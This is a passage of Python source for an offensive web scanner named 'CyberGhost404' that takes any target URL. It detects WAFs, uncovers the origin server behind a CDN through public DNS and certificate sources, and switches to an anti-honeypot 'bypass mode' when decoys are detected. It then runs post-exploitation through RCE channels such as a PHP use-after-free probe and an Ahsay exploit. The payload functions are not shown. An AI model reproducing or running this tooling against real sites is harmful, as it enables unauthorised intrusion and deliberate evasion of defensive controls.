        t0 = time.time()
        f = Finding(cve=f"{cwe_rec['cwe']} @ {path}", product=cwe_rec["name"],
                    cwe=cwe_rec["cwe"], cvss=7.0, attack=cwe_rec["cwe"],
                    tags=list(cwe_rec.get("tags", [])) + [f"path:{path}"])
        try:
            out = cwe_rec["detect"](self._client(), path)
            f.vulnerable = out.get("vulnerable"); f.confidence = out.get("confidence", 0)
            f.evidence = out.get("evidence", [])
            if out.get("error"): f.error = out["error"]
        except Exception as e: f.error = f"{type(e).__name__}: {e}"
        f.elapsed = round(time.time() - t0, 2); return f

    def run(self) -> List[Finding]:
        info(f"target: {self.base}")
        self.detect_waf()
        if self.waf: warn(f"WAF: {', '.join(self.waf)}")
        if self.waf and self.use_origin and self.host and not self.host.replace(".", "").isdigit():
            info("origin IP discovery..."); self.find_origin()

        self.honeypot = HoneypotDetector(self._client())
        if self.honeypot.check():
            warn(f"HONEYPOT DETECTED: {self.honeypot.reason()}")
            warn("Enabling BYPASS MODE — scan continues with anti-honeypot techniques")
            self.bypass_mode = True
            self._client().bypass_mode = True
        else:
            ok("honeypot check: clean")

        info("building baseline...")
        for p in ("", "/", "/wp-json/", "/?id=1"):
            try: self._client().baseline_for(p)
            except Exception: pass
        ok("baseline ready")

        info(f"running {len(CVE_DB)} CVE checks...")
        cve_vuln_count = 0
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.workers) as ex:
            futs = {ex.submit(self.scan_one, rec): rec for rec in CVE_DB}
            done = 0
            for fut in concurrent.futures.as_completed(futs):
                done += 1
                try:
                    f = fut.result(); self.findings.append(f)
                    if f.vulnerable is True: cve_vuln_count += 1
                    if f.vulnerable or f.error:
                        color = severity_color(f.vulnerable, f.confidence)
                        label = status_label(f.vulnerable, f.confidence)
                        print(f"  {color}{f.cve:24s} {f.product:26s} {f.attack:14s} {label} conf={f.confidence}%{C.X}")
                    if done % 50 == 0: info(f"  CVE progress: {done}/{len(CVE_DB)}")
                except Exception as e: warn(f"worker error: {e}")

        density_flag = self.honeypot.check_match_density(cve_vuln_count, len(CVE_DB))
        if density_flag:
            warn(f"MATCH DENSITY: {density_flag}")
            if not self.bypass_mode:
                warn("Enabling BYPASS MODE — continuing with anti-honeypot techniques")
                self.bypass_mode = True
                self._client().bypass_mode = True

        info(f"running {len(CWE_DB)} CWE checks (deduplicated)...")
        for cwe_rec in CWE_DB:
            best = None
            for path in cwe_rec["paths"]:
                try:
                    f = self.scan_one_cwe(cwe_rec, path)
                    if best is None: best = f
                    else: best = _better(f, best)
                    if f.vulnerable is True and f.confidence >= 60: break
                except Exception: continue
            if best is not None:
                self.findings.append(best)
                if best.vulnerable is True and best.confidence >= 40:
                    color = severity_color(best.vulnerable, best.confidence)
                    label = status_label(best.vulnerable, best.confidence)
                    print(f"  {color}{best.cve:32s} {best.product:26s} {label} conf={best.confidence}%{C.X}")

        rce_findings = [f for f in self.findings if f.vulnerable is True and "rce" in f.attack.lower()]
        if rce_findings:
            info("post-exploitation: probing RCE channels...")
            cache = {}
            def exec_fn(c):
                for f in rce_findings:
                    if "php" in f.tags:
                        if "php" not in cache: cache["php"] = probe_php_uaf(self._client(), c)
                        ev = cache["php"].get("evidence", [])
                        if ev and "uid=" in str(ev): return ev[0]
                    if "ahsay" in f.tags:
                        if "ahsay" not in cache: cache["ahsay"] = probe_ahsay_rce(self._client(), c)
                        ev = cache["ahsay"].get("evidence", [])
                        if ev: return ev[0]
                return "(no RCE channel)"
            self.post_exploit = run_post_exploit(exec_fn)
        return self.findings

    def report(self) -> dict:
        vuln = [f for f in self.findings if f.vulnerable is True]
        suspect = [f for f in self.findings if f.vulnerable is None]
        safe = [f for f in self.findings if f.vulnerable is False]
        return {
            "tool": "CyberGhost404", "version": "24.1", "telegram": TELEGRAM,
            "target": self.base, "timestamp": now_iso(), "waf": self.waf, "origin": self.origin,
            "geo": (self.origin or {}).get("geo") if self.origin else None,
            "bypass_mode": self.bypass_mode,
            "honeypot": {"detected": bool(self.honeypot and self.honeypot.is_honeypot()),
                         "reason": self.honeypot.reason() if self.honeypot else "",
                         "bypass_active": self.bypass_mode},
            "total_checks": len(self.findings), "vulnerable": len(vuln),
            "suspect": len(suspect), "safe": len(safe), "post_exploit": self.post_exploit,
            "findings": [asdict(f) for f in sorted(self.findings, key=lambda x: (-x.cvss, -x.confidence))],
        }

# ---------------------------------------------------------------------------
# ORIGIN FINDER
# ---------------------------------------------------------------------------
class OriginFinder:
    SOURCES = ["crt.sh","rapiddns","anubisdb","threatminer","urlscan","otx","hackertarget"]
    def __init__(self, domain, http): self.domain, self.http = domain, http; self.candidates, self.verified = set(), []
    def _add(self, ip):
        if ip and not is_cdn_ip(ip): self.candidates.add(ip)
    def _resolve(self, host):
        try: self._add(socket.gethostbyname(host))
        except Exception: pass
    def _crt(self):
        try:
            r = self.http.get(f"https://crt.sh/?q=%25.{self.domain}&output=json")
            if r.status_code == 200:
                for e in r.json():
                    for n in (e.get("name_value") or "").split("\n"):
                        n = n.strip().lower()
                        if n and "*" not in n: self._resolve(n)
        except Exception: pass
    def _rapiddns(self):
        try:
            r = self.http.get(f"https://rapiddns.io/subdomain/{self.domain}?full=1")
            for ip in re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", r.text): self._add(ip)
        except Exception: pass
    def _anubis(self):
        try:
            r = self.http.get(f"https://jldc.me/anubis/subdomains/{self.domain}")
            for h in r.json(): self._resolve(h)
        except Exception: pass
    def _threatminer(self):
        try:
            r = self.http.get(f"https://api.threatminer.org/v2/domain.php?q={self.domain}&rt=2")
            for h in (r.json().get("results") or []): self._resolve(h)
        except Exception: pass
    def _urlscan(self):
        try:
            r = self.http.get(f"https://urlscan.io/api/v1/search/?q=domain:{self.domain}&size=100")
            for e in (r.json().get("results") or []):
                ip = e.get("page", {}).get("ip")
                if ip: self._add(ip)
        except Exception: pass
    def _otx(self):
        try:
            r = self.http.get(f"https://otx.alienvault.com/api/v1/indicators/domain/{self.domain}/passive_dns")
            for e in (r.json().get("passive_dns") or []):
                ip = e.get("address")
                if ip: self._add(ip)
        except Exception: pass
    def _hackertarget(self):
        try:
            r = self.http.get(f"https://api.hackertarget.com/hostsearch/?q={self.domain}")
            for line in r.text.splitlines():
                if "," in line: self._add(line.split(",")[1].strip())
        except Exception: pass
    def find(self):
        info(f"origin discovery for {self.domain}")
        for name in self.SOURCES:
            fn = getattr(self, "_" + name.replace(".", "").replace("-", ""), None)
            if fn:
                try: fn()
                except Exception: pass
        info(f"  candidates: {len(self.candidates)}")
        for ip in list(self.candidates)[:80]:
            for scheme in ("https","http"):
                for port in (443,80,8080,8443):
                    try:
                        r = self.http.get(f"{scheme}://{ip}:{port}/", headers={**Identity.headers(), "Host": self.domain})
                        if r.status_code in (200,301,302,400,401,403,404):
                            geo = GEO.lookup(ip)
                            self.verified.append({"ip":ip,"scheme":scheme,"port":port,"status":r.status_code,"server":r.headers.get("Server",""),"geo":geo})
                            break
                    except Exception: continue
        return self.verified

# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def banner():
    print(f"""{C.B}
   ██████╗██╗   ██╗██████╗ ███████╗██████╗  ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗
  ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝
  ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝██║  ███╗███████║██║   ██║███████╗   ██║
  ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗██║   ██║██╔══██║██║   ██║╚════██║   ██║
  ╚██████╗   ██║   ██████╔╝███████╗██║  ██║╚██████╔╝██║  ██║╚██████╔╝███████║   ██║
   ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝
{C.D}  CyberGhost404 v24.1 — {len(CVE_DB)} CVEs + {len(CWE_DB)} CWEs | Debug Build
  {TELEGRAM}
{C.X}""")

def main():
    banner()
    p = argparse.ArgumentParser(description=f"CyberGhost404 v24.1 | {TELEGRAM}")
    p.add_argument("target", nargs="?", default=None)
    p.add_argument("--workers", type=int, default=DEF_WORKERS)
    p.add_argument("--timeout", type=int, default=DEF_TIMEOUT)
    p.add_argument("--proxy", default=None)
    p.add_argument("--no-origin", action="store_true")
    p.add_argument("--json", action="store_true")
    p.add_argument("--out", default=None)
    args = p.parse_args()
    target = args.target
    if not target:
        try: target = input(f"{C.B}Enter target URL: {C.X}").strip()
        except (EOFError, KeyboardInterrupt): print(); warn("no target"); sys.exit(1)
        if not target: warn("empty target"); sys.exit(1)
    scanner = Scanner(target, workers=args.workers, timeout=args.timeout,
                      proxy=args.proxy, use_origin=not args.no_origin)
    findings = scanner.run(); rep = scanner.report()
    print()
    print(f"{C.BOLD}{'=' * 60}{C.X}")
    print(f"  {C.G}SAFE{C.X}: {rep['safe']}   {C.Y}SUSPECT{C.X}: {rep['suspect']}   {C.R}VULNERABLE{C.X}: {rep['vulnerable']}")
    print(f"  total: {rep['total_checks']}")
    if rep["waf"]: warn(f"WAF: {rep['waf']}")
    if rep["origin"]: ok(f"origin: {rep['origin']['ip']}:{rep['origin']['port']}")
    if rep["honeypot"]["detected"]:
        warn(f"HONEYPOT: {rep['honeypot']['reason']}")
        ok(f"BYPASS MODE: {'ACTIVE' if rep['bypass_mode'] else 'inactive'}")
    if rep.get("post_exploit"):
        pe = rep["post_exploit"]; ok(f"post-exploit: OS={pe.get('os')}, checks={len(pe.get('results', {}))}")
    print(f"{C.BOLD}{'=' * 60}{C.X}")
    if args.json or args.out:
        text = json.dumps(rep, indent=2, ensure_ascii=False, default=str)
        if args.out:
            with open(args.out, "w", encoding="utf-8") as fh: fh.write(text)
            ok(f"report → {args.out}")
        else: print(text)

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: warn("interrupted"); sys.exit(130)